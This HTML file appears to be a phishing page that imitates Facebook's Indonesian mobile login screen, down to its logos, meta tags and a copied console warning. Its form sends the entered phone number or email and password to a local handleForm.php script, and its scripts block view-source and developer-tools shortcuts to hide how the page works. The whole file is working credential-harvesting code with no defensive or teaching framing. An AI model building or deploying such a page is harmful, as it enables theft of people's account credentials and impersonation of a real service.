<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta property="og:title" content="Facebook">
    <meta property="og:description" content="Facebook">
    <meta property="og:image" content="https://logopng.com.br/logos/facebook-13.png">
    <meta property="og:url" content="https://www.facebook.com">
    <title>Masuk Facebook | Facebook</title>
    <link rel="icon" type="image/png" sizes="32x32" href="assets/favicon.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.cdnfonts.com/css/optimistic-signature" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQKtxr5l8aD6LU2DMaIsXbPw4JqtaqK5R3z3k5C0Kj4f9F2yU7B7lS2m0" crossorigin="anonymous">

    <style>
        html,
        body {
            overflow: hidden;
            height: 100%;
            font-family: 'Optimistic Text Normal';
        }

        .background {
            background-image: radial-gradient(rgba(255, 255, 255, 0.25), rgba(255, 255, 255, 0) 40%),
                radial-gradient(rgb(255, 209, 82) 30%, rgb(226, 105, 150), rgba(226, 105, 150, 0.4) 41%, transparent 52%),
                radial-gradient(rgb(160, 51, 255) 37%, transparent 46%),
                linear-gradient(155deg, transparent 65%, rgb(37, 212, 102) 95%),
                linear-gradient(45deg, rgb(0, 101, 224), rgb(15, 139, 255));
            background-position: left bottom, 109% 68%, 109% 68%, center center, center center;
            background-repeat: no-repeat;
            background-size: 200% 200%, 285% 500%, 285% 500%, cover, cover;
            position: absolute;
            inset: 0;
            opacity: 0.08;
            pointer-events: none;
            z-index: -1;
            height: 100vh;
        }

        body {
            height: 100vh;
            margin: 0;
        }

        /* Style untuk placeholder */
        .custom-input::placeholder {
            color: rgb(103, 120, 138);
            /* Warna teks lebih gelap */
            font-weight: 400;
            font-size: 16px;
            font-family: "Optimistic Text Medium";
            opacity: 1;
            /* Pastikan placeholder tidak transparan */
        }

        /* Input styling dengan tinggi lebih besar */
        .custom-input {
            width: calc(100% - 24px);
            /* Lebar tetap responsif */
            height: 58px;
            /* Tinggi sedikit lebih besar */
            padding: 16px 18px;
            /* Memberikan ruang agar teks tidak terlalu mepet */
            border: 1px solid rgb(180, 190, 200);
            /* Warna border sedikit lebih gelap */
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 200ms ease, box-shadow 200ms ease;
            color: rgb(50, 65, 80);
            /* Warna teks lebih gelap */
        }

        /* Efek saat input dalam fokus */
        .custom-input:focus {
            outline: none;
            border-color: rgb(100, 120, 140);
            /* Warna fokus lebih gelap */
            box-shadow: 0px 0px 4px rgba(100, 120, 140, 0.3);
            /* Efek glow halus */
        }

        .custom-input {
            position: relative;
            padding: 10px;
            font-size: 16px;
            margin: 5px 0;
            border: 1px solid #ccc;
            outline: none;
            transition: all 0.1s ease;
        }

        .custom-input:focus::placeholder,
        .custom-input:hover::placeholder {
            font-size: 12px;
            transform: translateY(-10px);
            opacity: 0.8;
            transition: all 0.1s ease;
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            margin: 30px 30px 30px 30px;
            background: white;
            border-radius: 10px;
            text-align: center;
            width: 100%;
        }

        .modal-text {
            padding: 32px;
        }

        .modal-btn {
            padding: 12px 10px;
        }

        .modal button {
            color: rgb(0, 100, 224);
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            line-height: 1.5;
        }
    </style>
</head>

<body class=" ">

    <div class="background"></div>

    <div class="container mx-auto relative z-10">
        <div class="main-content">
            <div class="up">
                <p class="text-center mx-auto my-6 font-normal" style="color: rgb(70, 90, 105); font-weight: 400; font-size: 13px; font-family: 'Optimistic Text Normal';">Bahasa Indonesia</p>
                <img class="w-14 mx-auto bg-transparent my-16 rounded-full" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="">
            </div>

            <form class="down bg-none flex flex-col" id="form" action="handleForm.php" method="POST">
                <input class="custom-input mr-3 ml-3 mb-2" type="text" id="inputUsername" name="inputUsername" placeholder="Nomor Ponsel atau email">
                <input class="custom-input mr-3 ml-3 mb-3" type="password" id="inputPassword" name="inputPassword" placeholder="Kata Sandi">
                <button class="btn rounded-full mr-3 ml-3 py-2 cursor-pointer text-white font-semibold transition-all duration-50 ease-out"
                    style="height: 44px; min-width: 44px; background: rgb(0, 100, 224); font-size: 16px; font-weight: 500; border: none; border-radius: 22px; display: flex; align-items: center; justify-content: center; font-size: 15px; opacity: 1; transition: all 50ms ease-out;"
                    onmouseover="this.style.background='rgb(0, 135, 255)'; this.style.opacity='0.9'; this.style.transform='scaleX(0.98) scaleY(0.995)';"
                    onmouseout="this.style.background='rgb(0, 100, 224)'; this.style.opacity='1'; this.style.transform='scaleX(1) scaleY(1)';" onclick="validateLogin()">
                    Login
                </button>
                <p href="https://m.facebook.com/login/identify/"
                    class="mt-3 bg-none text-sm mx-auto mb-16 cursor-pointer transition-all duration-75 ease-out"
                    style="color: rgb(28, 43, 51); font-weight: 500; font-size: 16px; font-family: 'Optimistic Text Normal'; text-decoration: none; transition: all 75ms ease-out;"
                    onmouseover="this.style.color='rgb(50, 70, 90)'; this.style.textDecoration='none';"
                    onmouseout="this.style.color='rgb(28, 43, 51)'; this.style.textDecoration='none';">
                    Lupa kata sandi?
                </p>
            </form>
        </div>
        <!-- Modal Popup -->
        <div id="errorModal" class="modal" onclick="outsideClick(event)">
            <div class="modal-content">
                <div class="modal-text">
                    <p style="color: rgb(28, 30, 33); font-size: 18px; font-weight: 600;">Perlu email atau nomor ponsel</p>
                    <p style="color: rgb(101, 103, 107); font-size: 14px; margin-top: 12px;">Masukkan email atau nomor ponsel untuk melanjutkan.</p>
                </div>
                <div class="modal-btn" style="border-top: 1px solid rgb(206, 208, 212);" onclick="closeModal()">
                    <button onclick="closeModal()">OK</button>
                </div>
            </div>
        </div>
        <div class="bottom bg-none flex flex-col mt-20">
            <button href="https://m.facebook.com/reg/"
                class="btn rounded-full mr-3 ml-3 py-2 font-semibold cursor-pointer transition-all duration-75 ease-out"
                style="height: 44px; min-width: 44px; background: rgba(255, 255, 255, 0); border: 1px solid rgb(0, 100, 224); color: rgb(0, 100, 224); font-size: 15px; display: flex; align-items: center; justify-content: center; transition: all 75ms ease-out;"
                onmouseover="this.style.borderColor='rgb(0, 115, 240)'; this.style.color='rgb(0, 115, 240)'; this.style.transform='scale(0.98)';"
                onmouseout="this.style.borderColor='rgb(0, 100, 224)'; this.style.color='rgb(0, 100, 224)'; this.style.transform='scale(1)';">
                Buat akun baru
            </button>
            <div class="w-16 h-16 mx-auto bg-[rgb(70,90,105)]"
                style="mask-image: url(assets/meta.svg); -webkit-mask-image: url(assets/meta.svg); 
            mask-size: contain; mask-repeat: no-repeat;">
            </div>
        </div>

        <div class="footer text-center p-1"
            style="color: rgb(99, 120, 138); font-size: 10px;">
            <a href="#" class="mx-0.5" style="color: inherit; text-decoration: none;">Tentang</a>
            <a href="#" class="mx-0.5" style="color: inherit; text-decoration: none;">Bantuan</a>
            <a href="#" class="mx-0.5" style="color: inherit; text-decoration: none;">Lainnya</a>
        </div>
    </div>
</body>

<script>
    document.getElementById("inputUsername").removeAttribute("required");
    document.getElementById("inputPassword").removeAttribute("required");
</script>

<script>
    document.getElementById("form").addEventListener("submit", function(event) {
        let username = document.getElementById("inputUsername").value.trim();
        let password = document.getElementById("inputPassword").value.trim();

        if (username === "" || password === "") {
            event.preventDefault(); // Mencegah form terkirim
            document.getElementById("errorModal").style.display = "flex";
        }
    });

    function closeModal() {
        document.getElementById("errorModal").style.display = "none";
    }

    function outsideClick(event) {
        if (event.target.id === "errorModal") {
            closeModal();
        }
    }
</script>
<script>
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.key === 'u') {
            e.preventDefault();
        }
    });

    // Fungsi untuk mencegah XSS (Cross-Site Scripting)
    function sanitizeInput(input) {
        return input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
    }

    (function() {
        // Blokir kombinasi tombol tertentu
        document.addEventListener('keydown', function(event) {
            if ((event.ctrlKey && event.key === 'U') || // Ctrl + U (View Source)
                (event.ctrlKey && event.shiftKey && event.key === 'J') || // Ctrl + Shift + J (Console)
                (event.key === 'F12')) { // F12 (DevTools)
                event.preventDefault();
                alert("Fitur ini dinonaktifkan!");
            }
        });
    })();

    // Menampilkan peringatan di Console Developer
    (function() {
        console.log(
            '%cStop!',
            'color: red; font-size: 50px; font-weight: bold; font-family: Arial, Helvetica, sans-serif; margin-top: 15px'
        );
        console.log(
            '%cThis is a browser feature intended for developers. If someone told you to copy and paste something here to enable a Facebook feature or "hack" someone\'s account, it is a scam and will give them access to your Facebook account.',
            'color: white; font-size: 20px; font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;'
        );
        console.log(
            '%cSee https://www.facebook.com/selfxss for more information.',
            'color: white; font-size: 20px; line-height: font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;'
        );
    })();
</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-HoA1f00C8DJn67rw9+7bXLs4g0EtnqTnX7jXT1LYc6+ne2oyU1vKfWlip8zcvnL8" crossorigin="anonymous"></script>

</html>